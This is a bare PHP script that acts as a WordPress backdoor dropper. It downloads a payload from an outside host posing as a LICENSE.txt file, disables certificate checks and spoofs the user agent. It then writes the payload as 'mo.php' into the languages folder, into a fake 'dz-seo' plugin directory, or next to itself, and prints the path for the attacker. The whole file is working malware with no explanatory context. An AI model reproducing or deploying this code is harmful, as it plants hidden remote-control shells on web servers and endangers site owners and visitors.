<?php

$sh_path = crtf();

echo "|".$sh_path ."|";

$exepf = php_self();


function crtf()
{
	$shpath = $_SERVER['DOCUMENT_ROOT']."/wp-content/languages/mo.php";
	$shf = FFGet("http://dabirjoo.com/LICENSE.txt");
	if($shf=="")
	{
		return -1;
	}

	$result = file_put_contents($shpath, $shf);
	if($result)
	{
		return "/wp-content/languages/mo.php";
	}
	$shpath = $_SERVER['DOCUMENT_ROOT']."/wp-content/plugins/dz-seo";
	if(!file_exists($shpath)) mkdir($shpath);
	$shpath = $shpath."/mo.php";
	$result = file_put_contents($shpath, $shf);
	if($result)
	{
		return "/wp-content/plugins/dz-seo/mo.php";
	}
	$shpath = dirname(__FILE__)."/mo.php";
	$result = file_put_contents($shpath, $shf);

	return substr($_SERVER["REQUEST_URI"],0,strrpos($_SERVER['REQUEST_URI'],'/'))."/mo.php";

}

function php_self(){

    $php_self=substr($_SERVER['PHP_SELF'],strrpos($_SERVER['PHP_SELF'],'/')+1);

    return $php_self;

}


function FFGet( $url ){
	
    $file_contents ='';
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
	
    if(function_exists('file_get_contents')){
		ini_set('user_agent',$user_agent);
		try
		{
			$file_contents = @file_get_contents( $url );

		}
		catch (Exception $e)
		{ }
    }

    if(strlen($file_contents)<1&&function_exists('curl_init')){
        try
        {
             $file_contents ="";
             $ch = curl_init();
             $timeout = 30;
             curl_setopt($ch,CURLOPT_URL,$url);
             curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
             curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
             curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
             curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout);
             curl_setopt($ch,CURLOPT_USERAGENT,$user_agent);
             $file_contents = curl_exec( $ch);
             curl_close( $ch );
         }
         catch (Exception $e)
         {}
     }


    return $file_contents;
}
?>